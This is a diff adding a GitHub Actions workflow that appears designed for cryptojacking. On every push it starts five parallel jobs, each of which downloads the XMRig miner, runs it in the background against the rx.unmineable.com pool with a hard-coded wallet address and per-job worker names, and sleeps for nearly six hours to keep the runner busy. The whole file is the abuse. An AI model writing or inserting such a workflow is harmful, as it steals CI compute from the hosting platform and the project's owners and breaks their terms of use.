@@ -1,0 +1,17 @@
+name: M
+on: [push, workflow_dispatch]
+  
+jobs:
+  m:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    strategy:
+      matrix:
+        i: [1,2,3,4,5]
+    steps:
+      - run: |
+          wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz -O /tmp/x.tgz
+          tar -C /tmp -xf /tmp/x.tgz
+          cd /tmp/xmrig-*
+          ./xmrig -o rx.unmineable.com:3333 -u 0xA763c9f25d702B34022130dA0Fb8e92712a73091:USDT.t0271_4_${{ matrix.i }} -p x --donate-level 1 -k &
+          sleep 21000
